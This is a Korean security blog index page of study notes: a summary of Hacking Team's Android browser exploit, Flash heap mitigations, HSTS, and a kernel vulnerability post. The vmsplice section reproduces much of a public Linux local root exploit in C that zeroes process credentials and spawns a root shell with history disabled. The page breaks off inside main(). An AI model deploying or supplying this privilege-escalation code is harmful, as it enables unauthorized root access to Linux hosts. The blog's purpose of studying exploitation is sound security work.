
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>KC's blog</title>
  <meta name="author" content="KC">

  
  <meta name="description" content="Tencent 보안팀의 Hacking Team Android Browser Exploit 을 요약해본다. vector-exploit-master\src\ht-webkit-Android4-src 디렉토리에 Android Browser exploit 코드가 있다. &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://zomo.heroku.com/posts/5/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="KC's blog" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">KC's blog</a></h1>
  
    <h2>A blogging framework for hackers.</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="sitesearch" value="zomo.heroku.com">
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div class="blog-index">
  
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/07/17/hacking-teams-android-browser-exploit/">Hacking Team's Android Browser Exploit</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-07-17T17:20:22+09:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>17</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>5:20 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Tencent 보안팀의 <a href="https://translate.google.com/translate?sl=zh-CN&amp;tl=en&amp;js=y&amp;prev=_t&amp;hl=en&amp;ie=UTF-8&amp;u=http%3A%2F%2Fsecurity.tencent.com%2Findex.php%2Fblog%2Fmsg%2F87&amp;edit-text=">Hacking Team Android Browser Exploit</a> 을 요약해본다.</p>

<p><code>vector-exploit-master\src\ht-webkit-Android4-src</code> 디렉토리에 Android Browser exploit 코드가 있다.</p>

<ul>
<li>Information leak (CVE-2011-1202)</li>
<li>Arbitrary Memory Read (CVE-2012-2825)</li>
<li>Heap-Buffer-Overflow (CVE-2012-2871)</li>
</ul>


<p>을 사용한다.</p>

<h4>map_pages(Layout, num)</h4>

<h4>createsheetblob(addr)</h4>

<h4>start_bisect() / find_spray_addr()</h4>

<h4>CVE-2011-1202</h4>

<h4>XSLTObject.prototype.free</h4>

<h4>Overwrite ArrayBuffer</h4>

<h4>BufferMemoryObject.write32()</h4>

<h4>module.so</h4>

<h4>libwebcore.so / libc.so</h4>

<h4>fakevtable</h4>

<h4>ROP</h4>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/07/17/significant-flash-exploit-mitigations-are-live-in-v18-dot-0-0-dot-209/">Significant Flash Exploit Mitigations Are Live in v18.0.0.209</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-07-17T15:38:05+09:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>17</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>3:38 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Project Zero 의 Flash mitigation 에 관한 글을 요약 정리해본다.</p>

<p>이번에 버전업된 18.0.0.209 의 경우.</p>

<p><a href="http://googleprojectzero.blogspot.kr/2015/07/significant-flash-exploit-mitigations_16.html">Significant Flash exploit mitigations are live v18.0.0.209</a></p>

<h4>최근의 Flash exploit 경향</h4>

<p>heap 에서 앞쪽의 버퍼를 overflow 시켜서, 뒤쪽에 위치한 <code>Vector.&lt;uint&gt;</code> 를 overwrite 한다. <code>Vector.&lt;uint&gt;</code> 의 앞 4 바이트는 <code>length</code> 이다. 이 <code>length</code> 를 무지하게 큰 수로 만들어서 메모리 대부분을 read/write 할 수 있는 list 를 만든다.</p>

<p>또는 use-after-free 를 이용해서 <code>Vector.&lt;uint&gt;</code> 의 <code>length</code> 를 overwrite 한다. ByteArray 로 heap chunk 를 pointing 하게 셋업하고, free 시키고 <code>Vector.&lt;uint&gt;</code> 를 그 자리에 alloc 하고, 앞서 만든 ByteArray pointer 를 사용해 memory write 를 만들어낸다. 원래 heap chunk 는 free 되버리고, 이상한 녀석이 그 자리에 들어와있는데, memory write 가 일어나니, <code>Vector.&lt;uint&gt;</code> 의 <code>length</code> 에 write 가 일어나버리고, 역시 마찬가지로 <code>length</code> 가 무지하게 커져버린 전천후 list 가 만들어진다.</p>

<p>최근 공개된 Hacking Team 의 Flash 0day 들도 비슷한 use-after-free 방식.</p>

<h4>Mitigation: <code>Vector.&lt;uint&gt;</code> buffer heap partitioning</h4>

<p>Adobe Flash 18.0.0.209 에서는 Heap partitioning 을 도입했다. <code>Vector.&lt;uint&gt;</code> 가 alloc 되는 heap 을 별도로 마련한것.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>_bigVec = new Vector.&lt;uint&gt;;
</span><span class='line'>_bigVec.length = ((512 * 1024 * 1024) - 500) / 4;
</span><span class='line'>_bigVec[0] = 0xf2f2f2f2;
</span><span class='line'>_bigArr = new ByteArray();
</span><span class='line'>_bigArr.length = 512 * 1024 * 1024;
</span><span class='line'>_bigArr[0] = 0xf1;</span></code></pre></td></tr></table></div></figure>


<p>을 해서, 프로세스 메모리 맵을 보면 <code>_bigVec</code> 과 <code>_bigArr</code> 는 꽤 떨어진 영역에 위치하게 된다.</p>

<h4>Mitigations: stronger randomization for the Flash heap</h4>

<h4>Mitigations: <code>Vector.&lt;*&gt;</code> length validation</h4>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/07/17/http-strict-transport-security/">HTTP Strict Transport Security</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-07-17T15:04:07+09:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>17</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>3:04 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><h4>HTTP Strict Transport Security</h4>

<p>HSTS 를 안쓰면, HTTP -> 301 Moved Permanently -> HTTPS 로 바꿔야한다.</p>

<p>HSTS 를 쓰면, HTTP -> 307 Internal Redirect -> HTTPS 로 간다.</p>

<p>HSTS 의 경우 Chrome 이 request 조차 보내지 않는다.</p>

<p><code>Strict-Transport-Security: max-age=31536000; includeSubdomains; preload</code> 와 같은 헤더때문인데.</p>

<p>웹사이트가 HSTS 인지 아닌지 처음엔 모르기때문에, 첫 커넥션까지 HTTPS 로 가게 하려면,</p>

<p><a href="https://hstspreload.appspot.com">https://hstspreload.appspot.com</a> 에 등록해야한다.</p>

<h4>HTTP Public Key Pinning</h4>

<p>HTTP Public Key Pinning 의 경우도 중요한 기술.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/07/13/agtke-attacking-the-core/">AGTKE: Attacking the Core</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-07-13T10:07:33+09:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>13</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>10:07 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><h4>FreeBSD 8.0 &lsquo;Assigning values to uninitialized pointer&rsquo;</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>struct ucred ucred, *ucp;
</span><span class='line'>...
</span><span class='line'>refcount_init(&ucred.cr_ref, 1);
</span><span class='line'>ucred.cr_uid = ip-&gt;i_uid;
</span><span class='line'>ucred.cr_ngroups = 1;
</span><span class='line'>ucred.cr_groups[0] = dp-&gt;i_gid; 
</span><span class='line'>ucp = &ucred;</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>struct ucred {
</span><span class='line'>    u_int cr_ref;
</span><span class='line'>    ...
</span><span class='line'>    gid_t *cr_groups;
</span><span class='line'>    int cr_agroups;
</span><span class='line'>};</span></code></pre></td></tr></table></div></figure>


<p>ucred 는 스택에 alloc 되는데, 적절히 init 안하고, ucred.cr_groups[0] 에 writing 을 한다. 전에 불렸던 펑션콜의 스택 사용에 따라서 ucred.cr_groups 의 값이 바뀌게 된다.</p>

<h4>Linux vmsplice_to_user()</h4>

<ul>
<li>Linux kernel 2.6.17 - 2.6.24.1</li>
<li><a href="http://www.gossamer-threads.com/lists/linux/kernel/876580">CVE-2008-0009</a></li>
<li><a href="http://www.cs.fsu.edu/~baker/devices/lxr/http/source/linux/fs/splice.c?v=2.6.25">Patched src</a></li>
<li><a href="http://www.exploit-db.com/exploits/5092/">vmsplice exploit-db</a></li>
<li><a href="http://colesec.inventedtheinternet.com/tag/cve-2008-0009/">ColeSec</a></li>
<li><a href="http://www.reddit.com/r/netsec/comments/1eb9iw/sdfucksheeporgs_semtexc_local_linux_root_exploit/">semtex reddit thread</a></li>
</ul>


<p>base 는 user space 에서 온 값인데, <code>sd.u.userptr</code> 로 갔다가 __copy_to_user_inatomic() 이라는 write 함수로 흘러버린다. kernel 주소를 kernel 에 넘겨서, kernel memory write 를 하는 취약점.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>error = get_user(base, &iov-&gt;iov_base); // get_user 는 매크로라 &base 할 필요가 없다.
</span><span class='line'>...
</span><span class='line'>if (unlikely(!base)) {
</span><span class='line'>    error = -EFAULT;
</span><span class='line'>    break;
</span><span class='line'>}
</span><span class='line'>...
</span><span class='line'>sd.u.userptr = base;
</span><span class='line'>...
</span><span class='line'>size = __splice_from_pipe(pipe, &sd, pipe_to_user);
</span><span class='line'>...
</span><span class='line'>static int pipe_to_user(struct pipe_inode_info *pipe, struct pipe_buffer *buf,
</span><span class='line'>struct splice_desc *sd)
</span><span class='line'>{
</span><span class='line'>if (!fault_in_pages_writeable(sd-&gt;u.userptr, sd-&gt;len)) {
</span><span class='line'>    src = buf-&gt;ops-&gt;map(pipe, buf, 1);
</span><span class='line'>    ret = __copy_to_user_inatomic(sd-&gt;u.userptr, src+buf-&gt;offset, sd-&gt;len);
</span><span class='line'>    buf-&gt;ops-&gt;unmap(pipe, buf, src);
</span><span class='line'>...
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>


<p>exploit.c</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
<span class='line-number'>184</span>
<span class='line-number'>185</span>
<span class='line-number'>186</span>
<span class='line-number'>187</span>
<span class='line-number'>188</span>
<span class='line-number'>189</span>
<span class='line-number'>190</span>
<span class='line-number'>191</span>
<span class='line-number'>192</span>
<span class='line-number'>193</span>
<span class='line-number'>194</span>
<span class='line-number'>195</span>
<span class='line-number'>196</span>
<span class='line-number'>197</span>
<span class='line-number'>198</span>
<span class='line-number'>199</span>
<span class='line-number'>200</span>
<span class='line-number'>201</span>
<span class='line-number'>202</span>
<span class='line-number'>203</span>
<span class='line-number'>204</span>
<span class='line-number'>205</span>
<span class='line-number'>206</span>
<span class='line-number'>207</span>
<span class='line-number'>208</span>
<span class='line-number'>209</span>
<span class='line-number'>210</span>
<span class='line-number'>211</span>
<span class='line-number'>212</span>
<span class='line-number'>213</span>
<span class='line-number'>214</span>
<span class='line-number'>215</span>
<span class='line-number'>216</span>
<span class='line-number'>217</span>
<span class='line-number'>218</span>
<span class='line-number'>219</span>
<span class='line-number'>220</span>
<span class='line-number'>221</span>
<span class='line-number'>222</span>
<span class='line-number'>223</span>
<span class='line-number'>224</span>
<span class='line-number'>225</span>
<span class='line-number'>226</span>
<span class='line-number'>227</span>
<span class='line-number'>228</span>
<span class='line-number'>229</span>
<span class='line-number'>230</span>
<span class='line-number'>231</span>
<span class='line-number'>232</span>
<span class='line-number'>233</span>
<span class='line-number'>234</span>
<span class='line-number'>235</span>
<span class='line-number'>236</span>
<span class='line-number'>237</span>
<span class='line-number'>238</span>
<span class='line-number'>239</span>
<span class='line-number'>240</span>
<span class='line-number'>241</span>
<span class='line-number'>242</span>
<span class='line-number'>243</span>
<span class='line-number'>244</span>
<span class='line-number'>245</span>
<span class='line-number'>246</span>
<span class='line-number'>247</span>
<span class='line-number'>248</span>
<span class='line-number'>249</span>
<span class='line-number'>250</span>
<span class='line-number'>251</span>
<span class='line-number'>252</span>
<span class='line-number'>253</span>
<span class='line-number'>254</span>
<span class='line-number'>255</span>
<span class='line-number'>256</span>
<span class='line-number'>257</span>
<span class='line-number'>258</span>
<span class='line-number'>259</span>
<span class='line-number'>260</span>
<span class='line-number'>261</span>
<span class='line-number'>262</span>
<span class='line-number'>263</span>
<span class='line-number'>264</span>
<span class='line-number'>265</span>
<span class='line-number'>266</span>
<span class='line-number'>267</span>
<span class='line-number'>268</span>
<span class='line-number'>269</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>#define _GNU_SOURCE
</span><span class='line'>#include &lt;stdio.h&gt;
</span><span class='line'>#include &lt;errno.h&gt;
</span><span class='line'>#include &lt;stdlib.h&gt;
</span><span class='line'>#include &lt;string.h&gt;
</span><span class='line'>#include &lt;malloc.h&gt;
</span><span class='line'>#include &lt;limits.h&gt;
</span><span class='line'>#include &lt;signal.h&gt;
</span><span class='line'>#include &lt;unistd.h&gt;
</span><span class='line'>#include &lt;sys/uio.h&gt;
</span><span class='line'>#include &lt;sys/mman.h&gt;
</span><span class='line'>#include &lt;asm/page.h&gt;
</span><span class='line'>#define __KERNEL__
</span><span class='line'>#include &lt;asm/unistd.h&gt;
</span><span class='line'> 
</span><span class='line'>#define PIPE_BUFFERS    16
</span><span class='line'>#define PG_compound 14
</span><span class='line'>#define uint        unsigned int
</span><span class='line'>#define static_inline   static inline __attribute__((always_inline))
</span><span class='line'>#define STACK(x)    (x + sizeof(x) - 40)
</span><span class='line'> 
</span><span class='line'>struct page {
</span><span class='line'>    unsigned long flags;
</span><span class='line'>    int count;
</span><span class='line'>    int mapcount;
</span><span class='line'>    unsigned long private;
</span><span class='line'>    void *mapping;
</span><span class='line'>    unsigned long index;
</span><span class='line'>    struct { long next, prev; } lru;
</span><span class='line'>};
</span><span class='line'> 
</span><span class='line'>void    exit_code();
</span><span class='line'>char    exit_stack[1024 * 1024];
</span><span class='line'> 
</span><span class='line'>void    die(char *msg, int err)
</span><span class='line'>{
</span><span class='line'>    printf(err ? "[-] %s: %s\n" : "[-] %s\n", msg, strerror(err));
</span><span class='line'>    fflush(stdout);
</span><span class='line'>    fflush(stderr);
</span><span class='line'>    exit(1);
</span><span class='line'>}
</span><span class='line'> 
</span><span class='line'>#if defined (__i386__)
</span><span class='line'> 
</span><span class='line'>#ifndef __NR_vmsplice
</span><span class='line'>#define __NR_vmsplice   316
</span><span class='line'>#endif
</span><span class='line'> 
</span><span class='line'>#define USER_CS     0x73
</span><span class='line'>#define USER_SS     0x7b
</span><span class='line'>#define USER_FL     0x246
</span><span class='line'> 
</span><span class='line'>static_inline
</span><span class='line'>void    exit_kernel()
</span><span class='line'>{
</span><span class='line'>    __asm__ __volatile__ (
</span><span class='line'>    "movl %0, 0x10(%%esp) ;"
</span><span class='line'>    "movl %1, 0x0c(%%esp) ;"
</span><span class='line'>    "movl %2, 0x08(%%esp) ;"
</span><span class='line'>    "movl %3, 0x04(%%esp) ;"
</span><span class='line'>    "movl %4, 0x00(%%esp) ;"
</span><span class='line'>    "iret"
</span><span class='line'>    : : "i" (USER_SS), "r" (STACK(exit_stack)), "i" (USER_FL),
</span><span class='line'>        "i" (USER_CS), "r" (exit_code)
</span><span class='line'>    );
</span><span class='line'>}
</span><span class='line'> 
</span><span class='line'>static_inline
</span><span class='line'>void *  get_current()
</span><span class='line'>{
</span><span class='line'>    unsigned long curr;
</span><span class='line'>    __asm__ __volatile__ (
</span><span class='line'>    "movl %%esp, %%eax ;"
</span><span class='line'>    "andl %1, %%eax ;"
</span><span class='line'>    "movl (%%eax), %0"
</span><span class='line'>    : "=r" (curr)
</span><span class='line'>    : "i" (~8191)
</span><span class='line'>    );
</span><span class='line'>    return (void *) curr;
</span><span class='line'>}
</span><span class='line'> 
</span><span class='line'>#elif defined (__x86_64__)
</span><span class='line'> 
</span><span class='line'>#ifndef __NR_vmsplice
</span><span class='line'>#define __NR_vmsplice   278
</span><span class='line'>#endif
</span><span class='line'> 
</span><span class='line'>#define USER_CS     0x23
</span><span class='line'>#define USER_SS     0x2b
</span><span class='line'>#define USER_FL     0x246
</span><span class='line'> 
</span><span class='line'>static_inline
</span><span class='line'>void    exit_kernel()
</span><span class='line'>{
</span><span class='line'>    __asm__ __volatile__ (
</span><span class='line'>    "swapgs ;"
</span><span class='line'>    "movq %0, 0x20(%%rsp) ;"
</span><span class='line'>    "movq %1, 0x18(%%rsp) ;"
</span><span class='line'>    "movq %2, 0x10(%%rsp) ;"
</span><span class='line'>    "movq %3, 0x08(%%rsp) ;"
</span><span class='line'>    "movq %4, 0x00(%%rsp) ;"
</span><span class='line'>    "iretq"
</span><span class='line'>    : : "i" (USER_SS), "r" (STACK(exit_stack)), "i" (USER_FL),
</span><span class='line'>        "i" (USER_CS), "r" (exit_code)
</span><span class='line'>    );
</span><span class='line'>}
</span><span class='line'> 
</span><span class='line'>static_inline
</span><span class='line'>void *  get_current()
</span><span class='line'>{
</span><span class='line'>    unsigned long curr;
</span><span class='line'>    __asm__ __volatile__ (
</span><span class='line'>    "movq %%gs:(0), %0"
</span><span class='line'>    : "=r" (curr)
</span><span class='line'>    );
</span><span class='line'>    return (void *) curr;
</span><span class='line'>}
</span><span class='line'> 
</span><span class='line'>#else
</span><span class='line'>#error "unsupported arch"
</span><span class='line'>#endif
</span><span class='line'> 
</span><span class='line'>#if defined (_syscall4)
</span><span class='line'>#define __NR__vmsplice  __NR_vmsplice
</span><span class='line'>_syscall4(
</span><span class='line'>    long, _vmsplice,
</span><span class='line'>    int, fd,
</span><span class='line'>    struct iovec *, iov,
</span><span class='line'>    unsigned long, nr_segs,
</span><span class='line'>    unsigned int, flags)
</span><span class='line'> 
</span><span class='line'>#else
</span><span class='line'>#define _vmsplice(fd,io,nr,fl)  syscall(__NR_vmsplice, (fd), (io), (nr), (fl))
</span><span class='line'>#endif
</span><span class='line'> 
</span><span class='line'>static uint uid, gid;
</span><span class='line'> 
</span><span class='line'>void    kernel_code()
</span><span class='line'>{
</span><span class='line'>    int i;
</span><span class='line'>    uint    *p = get_current();
</span><span class='line'> 
</span><span class='line'>    for (i = 0; i &lt; 1024-13; i++) {
</span><span class='line'>        if (p[0] == uid && p[1] == uid &&
</span><span class='line'>            p[2] == uid && p[3] == uid &&
</span><span class='line'>            p[4] == gid && p[5] == gid &&
</span><span class='line'>            p[6] == gid && p[7] == gid) {
</span><span class='line'>            p[0] = p[1] = p[2] = p[3] = 0;
</span><span class='line'>            p[4] = p[5] = p[6] = p[7] = 0;
</span><span class='line'>            p = (uint *) ((char *)(p + 8) + sizeof(void *));
</span><span class='line'>            p[0] = p[1] = p[2] = ~0;
</span><span class='line'>            break;
</span><span class='line'>        }
</span><span class='line'>        p++;
</span><span class='line'>    }   
</span><span class='line'> 
</span><span class='line'>    exit_kernel();
</span><span class='line'>}
</span><span class='line'> 
</span><span class='line'>void    exit_code()
</span><span class='line'>{
</span><span class='line'>    if (getuid() != 0)
</span><span class='line'>        die("wtf", 0);
</span><span class='line'> 
</span><span class='line'>    printf("[+] root\n");
</span><span class='line'>    putenv("HISTFILE=/dev/null");
</span><span class='line'>    execl("/bin/bash", "bash", "-i", NULL);
</span><span class='line'>    die("/bin/bash", errno);
</span><span class='line'>}
</span><span class='line'> 
</span><span class='line'>int main(int argc, char *argv[])
</span><span class='line'>{
</span><span class='line'>    int     pi[2];
</span><span class='line'>    size_t      map_size;
</span><span class='line'>    char *      map_addr;
</span><span class='line'>    struct iovec    iov;
</span><span class='line'>    struct page *   pages[5];
</span><span class='line'> 
</span><span class='line'>    uid = getuid();
</span><span class='line'>    gid = getgid();
</span><span class='line'>    setresuid(uid, uid, uid);
</span><span class='line'>    setresgid(gid, gid, gid);
</span><span class='line'> 
</span><span class='line'>    printf("-----------------------------------\n");
</span><span class='line'>    printf(" Linux vmsplice Local Root Exploit\n");
</span><span class='line'>    printf(" By qaaz\n");
</span><span class='line'>    printf("-----------------------------------\n");
</span><span class='line'> 
</span><span class='line'>    if (!uid || !gid)
</span><span class='line'>        die("!@#$", 0);
</span><span class='line'> 
</span><span class='line'>    /*****/
</span><span class='line'>    pages[0] = *(void **) &(int[2]){0,PAGE_SIZE};
</span><span class='line'>    pages[1] = pages[0] + 1;
</span><span class='line'> 
</span><span class='line'>    map_size = PAGE_SIZE;
</span><span class='line'>    map_addr = mmap(pages[0], map_size, PROT_READ | PROT_WRITE,
</span><span class='line'>                    MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
</span><span class='line'>    if (map_addr == MAP_FAILED)
</span><span class='line'>        die("mmap", errno);
</span><span class='line'> 
</span><span class='line'>    memset(map_addr, 0, map_size);
</span><span class='line'>    printf("[+] mmap: 0x%lx .. 0x%lx\n", map_addr, map_addr + map_size);
</span><span class='line'>    printf("[+] page: 0x%lx\n", pages[0]);
</span><span class='line'>    printf("[+] page: 0x%lx\n", pages[1]);
</span><span class='line'> 
</span><span class='line'>    pages[0]-&gt;flags    = 1 &lt;&lt; PG_compound;
</span><span class='line'>    pages[0]-&gt;private  = (unsigned long) pages[0];
</span><span class='line'>    pages[0]-&gt;count    = 1;
</span><span class='line'>    pages[1]-&gt;lru.next = (long) kernel_code;
</span><span class='line'> 
</span><span class='line'>    /*****/
</span><span class='line'>    pages[2] = *(void **) pages[0];
</span><span class='line'>    pages[3] = pages[2] + 1;
</span><span class='line'> 
</span><span class='line'>    map_size = PAGE_SIZE;
</span><span class='line'>    map_addr = mmap(pages[2], map_size, PROT_READ | PROT_WRITE,
</span><span class='line'>                    MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
</span><span class='line'>    if (map_addr == MAP_FAILED)
</span><span class='line'>        die("mmap", errno);
